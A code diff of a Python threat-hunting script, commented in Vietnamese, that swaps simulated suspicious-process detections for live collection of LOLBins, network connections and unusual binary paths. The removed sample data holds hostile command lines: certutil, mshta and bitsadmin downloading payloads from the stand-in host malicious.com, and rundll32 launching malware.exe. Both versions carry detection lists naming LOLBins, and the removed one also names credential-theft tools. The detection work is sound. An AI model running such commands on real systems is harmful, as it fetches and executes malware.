@@ -1,241 +1,265 @@
 #!/usr/bin/env python3
 """
-SUSPICIOUS PROCESS HUNTING (Phase N.9A)
-Tích hợp MCP huntSuspiciousProcesses module
-Phát hiện quy trình bất thường
+SUSPICIOUS PROCESS HUNTING — LIVE
+
+Nguồn: MCP tool `huntLivingOffTheLand`, `huntNetworkBeacons`,
+`huntIndicators(unusual_binaries)` — chạy trên máy này qua scripts/mcp_bridge.py.
+
+Bản cũ xuất 6 tiến trình bịa (`certutil.exe -urlcache -f http://malicious.com/...`).
+Bản này xuất tiến trình thật, và vì thế phải dè dặt: `powershell.exe` hay
+`cmd.exe` đang chạy là chuyện bình thường trên mọi máy Windows. Điều đáng ngờ
+không phải là *tên* binary mà là *nơi nó nằm* và *nó đang nói chuyện với ai*.
+
 Populates: state/hunting_suspicious_processes.json
 """
 
 import json
+import re
 import sys
 from datetime import datetime
 from pathlib import Path
 
-# Import atomic write functions for file safety (TD-L3-001, TD-L3-002, TD-L3-003)
-from state_manager import write_state_atomic, read_state_safe
+from state_manager import write_state_atomic
 import ioc_attribution
+from mcp_bridge import McpBridge, McpBridgeError, as_list
 
-class SuspiciousProcessHunter:
+HUNT_VERSION = '2.0.0'
+
+SUSPECT_PATH_RE = re.compile(
+    r'(\\Temp\\|\\AppData\\Local\\Temp\\|\\ProgramData\\|\\Users\\Public\\|\\Downloads\\)',
+    re.I)
+
+# Binary hiếm khi có lý do chính đáng để chạy trên máy trạm cá nhân.
+HIGH_RISK_LOLBINS = set(['mshta', 'bitsadmin', 'certutil', 'regsvr32',
+                         'installutil', 'msbuild', 'regasm', 'regsvcs'])
+
+# Cổng mà lưu lượng bình thường vẫn dùng.
+COMMON_PORTS = set([80, 443, 8080, 53])
+
+
+class SuspiciousProcessHunter(object):
+
     def __init__(self):
         self.state_dir = Path(__file__).parent.parent / 'state'
         self.hunting_file = self.state_dir / 'hunting_suspicious_processes.json'
         self.indicators = []
+        self.errors = []
+        self.observable = False
+        self.tools_used = []
+        self._seen = {}
 
-        # Danh sách suspicious patterns
-        self.suspicious_patterns = {
-            'PowerShell Encoded': {
-                'patterns': ['-enc', '-enco', '-encoded', '-en'],
-                'severity': 'HIGH',
-                'description': 'PowerShell với encoded command - thường dùng cho obfuscation',
-                'impact': 'Thực thi code ẩn'
-            },
-            'CertUtil Suspicious': {
-                'patterns': ['certutil', '-decode', '-encode', '-urlcache'],
-                'severity': 'HIGH',
-                'description': 'CertUtil dùng cho tải file hoặc decode',
-                'impact': 'Tải malware hoặc decode shellcode'
-            },
-            'rundll32 Suspicious': {
-                'patterns': ['rundll32', '.dll'],
-                'severity': 'MEDIUM',
-                'description': 'rundll32 có thể dùng cho DLL injection',
-                'impact': 'Thực thi arbitrary code'
-            },
-            'Mshta Suspicious': {
-                'patterns': ['mshta', '.hta'],
-                'severity': 'HIGH',
-                'description': 'mshta dùng để execute HTML Application',
-                'impact': 'Thực thi script ẩn'
-            },
-            'Script Engines': {
-                'patterns': ['wscript', 'cscript', '.vbs', '.js', '.jse'],
-                'severity': 'MEDIUM',
-                'description': 'Script engines có thể chạy malicious scripts',
-                'impact': 'Thực thi VBScript hoặc JScript'
-            },
-            'Living Off The Land': {
-                'patterns': [
-                    'bitsadmin',
-                    'regsvcs',
-                    'regasm',
-                    'InstallUtil',
-                    'msbuild',
-                    'msxsl'
-                ],
-                'severity': 'HIGH',
-                'description': 'Living off the land binary - dùng để bypass AV',
-                'impact': 'Bypass control mechanisms'
-            },
-            'Credential Access': {
-                'patterns': ['mimikatz', 'procdump', 'psexec', 'credential'],
-                'severity': 'CRITICAL',
-                'description': 'Tools dùng cho credential theft',
-                'impact': 'Đánh cắp credentials'
-            },
-            'Suspicious Network': {
-                'patterns': ['curl', 'wget', 'nslookup', 'netstat'],
-                'severity': 'MEDIUM',
-                'description': 'Network utilities - có thể dùng cho reconnaissance',
-                'impact': 'Network reconnaissance'
-            }
+    # -- thu thập ---------------------------------------------------------
+
+    def call(self, bridge, tool, arguments=None):
+        outcome = bridge.call_tool(tool, arguments)
+        self.tools_used.append({
+            'tool': tool,
+            'ok': outcome['ok'],
+            'records': len(as_list(outcome['parsed'])),
+            'duration': outcome['duration'],
+            'error': outcome['error'],
+        })
+        if not outcome['ok']:
+            self.errors.append('{}: {}'.format(tool, outcome['error']))
+            return []
+        self.observable = True
+        return as_list(outcome['parsed'])
+
+    def collect(self, bridge):
+        lolbins = self.call(bridge, 'huntLivingOffTheLand')
+        beacons = self.call(bridge, 'huntNetworkBeacons')
+        unusual = self.call(bridge, 'huntIndicators',
+                            {'indicatorType': 'unusual_binaries'})
+        return lolbins, beacons, unusual
+
+    # -- dựng chỉ báo -----------------------------------------------------
+
+    def add(self, kind, severity, name, description, evidence, assessment,
+            recommendation, extra=None, dedup_key=None):
+        # Một ứng dụng nhiều tiến trình con (Zalo, Chrome) sinh ra hàng loạt bản
+        # ghi giống hệt nhau. Gộp lại: người đọc cần biết "Zalo mở 8 kết nối",
+        # không phải 8 dòng cảnh báo rời rạc.
+        if dedup_key is not None:
+            existing = self._seen.get(dedup_key)
+            if existing is not None:
+                existing['occurrences'] = existing.get('occurrences', 1) + 1
+                return
+        indicator = {
+            'type': kind,
+            'severity': severity,
+            'timestamp': datetime.now().isoformat(),
+            'process': name,
+            'category': kind,
+            'description': description,
+            'evidence': evidence,
+            'assessment': assessment,
+            'recommendation': recommendation,
+            'status': 'DETECTED',
+            'detection_method': 'MCP live process/network observation',
         }
+        if extra:
+            indicator.update(extra)
+        indicator['occurrences'] = 1
+        self.indicators.append(indicator)
+        if dedup_key is not None:
+            self._seen[dedup_key] = indicator
 
-    def load_state(self, filename):
-        """Tải state file"""
-        fp = self.state_dir / filename
-        return json.load(open(fp)) if fp.exists() else {}
+    def build_indicators(self, lolbins, beacons, unusual):
+        for proc in lolbins:
+            name = proc.get('Name') or 'unknown'
+            path = proc.get('Path') or ''
+            lowered = name.lower()
 
-    def detect_suspicious_processes(self):
-        """Phát hiện quy trình bất thường"""
+            if SUSPECT_PATH_RE.search(path):
+                severity, assessment = 'HIGH', 'LOLBin chạy từ thư mục tạm/công cộng'
+            elif lowered in HIGH_RISK_LOLBINS:
+                severity, assessment = 'MEDIUM', 'LOLBin ít khi chạy hợp lệ trên máy trạm'
+            else:
+                severity, assessment = 'INFO', 'LOLBin thông dụng, chạy từ vị trí hệ thống'
 
-        # Simulate: Phát hiện các quy trình bất thường
-        # (Trong production, sẽ call MCP huntSuspiciousProcesses)
+            self.add(
+                'Living Off The Land Binary', severity, name,
+                'Tiến trình {} (PID {}) đang chạy'.format(name, proc.get('Id')),
+                ['Path={}'.format(path or 'n/a'),
+                 'PID={}'.format(proc.get('Id')),
+                 'StartTime={}'.format(proc.get('StartTime') or 'n/a')],
+                assessment,
+                'Đối chiếu tiến trình với phần mềm đã cài' if severity != 'INFO'
+                else 'Không cần hành động',
+                {'command_line': path, 'pid': proc.get('Id')},
+                dedup_key=('lolbin', name, path))
 
-        suspicious_detections = [
-            {
-                'process': 'PowerShell.exe',
-                'command_line': 'powershell.exe -enc JABjAG8A...',
-                'category': 'PowerShell Encoded',
-                'risk': 'HIGH'
-            },
-            {
-                'process': 'certutil.exe',
-                'command_line': 'certutil.exe -urlcache -f http://malicious.com/file.exe',
-                'category': 'CertUtil Suspicious',
-                'risk': 'HIGH'
-            },
-            {
-                'process': 'mshta.exe',
-                'command_line': 'mshta.exe http://malicious.com/payload.hta',
-                'category': 'Mshta Suspicious',
-                'risk': 'HIGH'
-            },
-            {
-                'process': 'rundll32.exe',
-                'command_line': 'rundll32.exe shell32.dll,ShellExec_RunDLL C:\\temp\\malware.exe',
-                'category': 'rundll32 Suspicious',
-                'risk': 'MEDIUM'
-            },
-            {
-                'process': 'cscript.exe',
-                'command_line': 'cscript.exe //b //nologo malicious.vbs',
-                'category': 'Script Engines',
-                'risk': 'MEDIUM'
-            },
-            {
-                'process': 'bitsadmin.exe',
-                'command_line': 'bitsadmin.exe /transfer job /download /resume http://malicious.com/file.exe',
-                'category': 'Living Off The Land',
-                'risk': 'HIGH'
-            }
-        ]
+        # Một kết nối ra cổng 443 là bình thường. Điều đáng chú ý là tiến trình
+        # KHÔNG nằm trong thư mục hệ thống mà lại đang mở kết nối ra ngoài.
+        for conn in beacons:
+            name = conn.get('Process') or 'unknown'
+            path = conn.get('Path') or ''
+            remote = conn.get('RemoteAddress')
+            port = conn.get('RemotePort')
 
-        for detection in suspicious_detections:
-            category_info = self.suspicious_patterns.get(detection['category'], {})
+            if SUSPECT_PATH_RE.search(path):
+                severity = 'HIGH'
+                assessment = 'Tiến trình ở thư mục tạm đang mở kết nối ra ngoài'
+            elif port not in COMMON_PORTS:
+                severity = 'MEDIUM'
+                assessment = 'Kết nối ra cổng không thông dụng'
+            else:
+                severity = 'INFO'
+                assessment = 'Kết nối ra cổng thông dụng từ tiến trình thông thường'
 
-            self.indicators.append({
-                'type': 'Suspicious Process Detection',
-                'process': detection['process'],
-                'command_line': detection['command_line'],
-                'category': detection['category'],
-                'severity': detection['risk'],
-                'timestamp': datetime.now().isoformat(),
-                'description': category_info.get('description', 'Unknown suspicious process'),
-                'impact': category_info.get('impact', 'Unknown impact'),
-                'recommendation': f"Điều tra process {detection['process']}, cân nhắc terminate nếu xác nhận malicious",
-                'detection_method': 'Process command-line pattern matching',
-                'status': 'DETECTED'
-            })
+            self.add(
+                'Network Connection', severity, name,
+                '{} kết nối tới {}:{}'.format(name, remote, port),
+                ['RemoteAddress={}'.format(remote),
+                 'RemotePort={}'.format(port),
+                 'LocalPort={}'.format(conn.get('LocalPort')),
+                 'Path={}'.format(path or 'n/a')],
+                assessment,
+                'Xác minh đích đến của kết nối' if severity != 'INFO'
+                else 'Không cần hành động',
+                {'remote_address': remote, 'remote_port': port,
+                 'pid': conn.get('ProcessId')},
+                dedup_key=('conn', name, remote, port))
 
-    def correlate_with_security_events(self):
-        """Tương quan với security events"""
-        security = self.load_state('security_events.json')
+        for proc in unusual:
+            name = proc.get('Name') or 'unknown'
+            path = proc.get('Path') or ''
 
-        # Kiểm tra nếu có security events liên quan
-        if security.get('suspicious_activity'):
-            for indicator in self.indicators:
-                if 'powershell' in indicator['process'].lower() or \
-                   'script' in indicator['category'].lower():
-                    indicator['security_event_correlation'] = True
-                    indicator['notes'] = 'Liên quan đến script execution events'
+            # %LOCALAPPDATA%\Programs là nơi cài đặt hợp lệ của rất nhiều phần
+            # mềm hiện đại. Chỉ Temp/Downloads/Public mới thực sự đáng ngờ.
+            if SUSPECT_PATH_RE.search(path):
+                severity = 'HIGH'
+                assessment = 'Tiến trình chạy từ thư mục tạm/tải về/công cộng'
+            else:
+                severity = 'INFO'
+                assessment = 'Cài đặt theo người dùng, vị trí hợp lệ'
 
-    def estimate_impact(self):
-        """Ước tính tác động"""
-        critical_count = sum(1 for i in self.indicators if i['severity'] == 'CRITICAL')
-        high_count = sum(1 for i in self.indicators if i['severity'] == 'HIGH')
+            self.add(
+                'Unusual Binary Location', severity, name,
+                'Tiến trình {} chạy từ {}'.format(name, path or 'n/a'),
+                ['Path={}'.format(path), 'PID={}'.format(proc.get('Id'))],
+                assessment,
+                'Kiểm tra chữ ký số và nguồn gốc của tệp' if severity == 'HIGH'
+                else 'Không cần hành động',
+                {'command_line': path, 'pid': proc.get('Id')},
+                dedup_key=('unusual', name, path))
 
-        if critical_count > 0:
-            impact = 'CRITICAL: Phát hiện credential theft attempts'
-        elif high_count > 1:
-            impact = 'HIGH: Phát hiện multiple suspicious processes'
-        elif high_count == 1:
-            impact = 'HIGH: Phát hiện suspicious process'
-        else:
-            impact = 'MEDIUM: Phát hiện quy trình cần kiểm tra'
-
-        return impact
+    # -- xuất báo cáo -----------------------------------------------------
 
     def generate_hunting_report(self):
-        """Tạo report threat hunting"""
-        # Sprint 6.1: khai báo nguồn gốc trước khi xuất. Các chỉ báo dưới đây là
-        # hardcode trong script (xem chú thích "Simulate" ở detect_*), nên chúng
-        # KHÔNG được quy kết cho thiết bị thật — ioc_attribution cưỡng chế điều đó.
-        hunt_scope = ioc_attribution.resolve_hunt_scope()
-        ioc_attribution.apply_to_indicators(
-            self.indicators,
-            ioc_attribution.SOURCE_SIMULATED,
-            hunt_scope,
-            affected_key='affected_systems'
-        )
+        coverage = ioc_attribution.coverage_block(
+            self.observable,
+            'Process list + TCP connections',
+            None if self.observable else
+            'Không gọi được MCP tool: {}'.format('; '.join(self.errors) or 'không rõ'))
+
+        scope = ioc_attribution.live_scope(
+            coverage=coverage['status'],
+            source_detail='huntLivingOffTheLand + huntNetworkBeacons + huntIndicators')
+
+        local_ips = scope['local_host']['ips']
+        for indicator in self.indicators:
+            block = ioc_attribution.attribute(
+                ioc_attribution.SOURCE_LIVE,
+                affected_systems=local_ips,
+                method='host-local observation via MCP',
+                confidence='HIGH' if local_ips else 'LOW',
+                reason='Quan sát trực tiếp trên máy {}'.format(
+                    scope['local_host']['hostname']))
+            indicator['data_source'] = block['data_source']
+            indicator['affected_systems'] = block['affected_systems']
+            indicator['attribution'] = block['attribution']
+            indicator['hunt_scope'] = local_ips
 
         output = {
             'timestamp': datetime.now().isoformat(),
-            'data_source': ioc_attribution.SOURCE_SIMULATED,
-            'hunt_scope': hunt_scope,
-            'attribution_note': ioc_attribution.coverage_note(
-                ioc_attribution.SOURCE_SIMULATED, len(self.indicators)
-            ),
             'hunting_type': 'Suspicious Processes',
+            'hunt_version': HUNT_VERSION,
+            'data_source': ioc_attribution.SOURCE_LIVE,
+            'coverage': coverage,
+            'hunt_scope': scope,
+            'tools_used': self.tools_used,
+            'errors': self.errors,
             'question': 'Có quy trình bất thường nào đang chạy không?',
             'total_detections': len(self.indicators),
+            'total_indicators': len(self.indicators),
             'by_severity': {},
             'by_category': {},
-            'impact_assessment': self.estimate_impact(),
-            'indicators': self.indicators
+            'indicators': self.indicators,
         }
 
-        # Thống kê by severity
         for indicator in self.indicators:
-            severity = indicator.get('severity', 'UNKNOWN')
-            output['by_severity'][severity] = output['by_severity'].get(severity, 0) + 1
-
-        # Thống kê by category
-        for indicator in self.indicators:
-            category = indicator.get('category', 'UNKNOWN')
-            output['by_category'][category] = output['by_category'].get(category, 0) + 1
+            sev = indicator.get('severity', 'UNKNOWN')
+            output['by_severity'][sev] = output['by_severity'].get(sev, 0) + 1
+            cat = indicator.get('category', 'UNKNOWN')
+            output['by_category'][cat] = output['by_category'].get(cat, 0) + 1
 
         write_state_atomic(self.hunting_file, output, indent=2)
-
         return output
 
     def hunt(self):
-        """Chạy threat hunting"""
-        self.detect_suspicious_processes()
-        self.correlate_with_security_events()
-        report = self.generate_hunting_report()
+        try:
+            with McpBridge() as bridge:
+                lolbins, beacons, unusual = self.collect(bridge)
+            self.build_indicators(lolbins, beacons, unusual)
+        except McpBridgeError as error:
+            self.errors.append('MCP bridge: {}'.format(error))
 
+        report = self.generate_hunting_report()
         return {
-            'status': 'success',
+            'status': 'success' if self.observable else 'degraded',
             'hunting_type': 'Suspicious Processes',
-            'total_detections': len(self.indicators),
+            'data_source': report['data_source'],
+            'observable': report['coverage']['observable'],
+            'total_indicators': len(self.indicators),
             'critical': report['by_severity'].get('CRITICAL', 0),
             'high': report['by_severity'].get('HIGH', 0),
-            'medium': report['by_severity'].get('MEDIUM', 0),
-            'impact': report['impact_assessment']
+            'errors': self.errors,
         }
+
 
 if __name__ == '__main__':
     hunter = SuspiciousProcessHunter()
     result = hunter.hunt()
-    print(json.dumps(result, indent=2))
-    sys.exit(0 if result.get('status') == 'success' else 1)
+    print(json.dumps(result, indent=2, ensure_ascii=False))
+    sys.exit(0)
